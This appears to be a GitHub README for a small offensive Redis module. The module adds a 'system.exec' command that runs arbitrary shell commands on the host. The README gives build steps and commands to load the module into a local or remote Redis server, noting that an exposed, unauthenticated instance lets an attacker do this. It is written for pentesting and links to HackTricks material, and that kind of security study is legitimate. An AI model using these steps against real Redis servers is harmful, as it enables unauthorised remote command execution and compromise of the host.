# redis-rce-module

A minimal Redis module to achieve RCE. It demonstrates the
classic Redis post-exploitation primitive: once an attacker can load a module
into a Redis server (e.g. an exposed, unauthenticated instance), they get
arbitrary command execution on the host.

## What it does

Registers a single Redis command:

```bash
system.exec "[COMMAND]"
```

It runs the given string through the shell (`popen`) and replies with the
command's stdout.

## Usage

```bash
make
```

This produces `module.so` in the project root.

## Run

Start a Redis server with the module loaded:

```bash
redis-server --loadmodule ./module.so
redis-cli system.exec "id"
```

Or load it into a running server (upload to server first):

```bash
redis-cli -h $tip MODULE LOAD /full/path/to/module.so
```

## Resources:
- https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#load-redis-module # Initial find of attack vector
- https://github.com/n0b0dyCN/RedisModules-ExecuteCommand # Repo mentioned by hacktricks which is outdated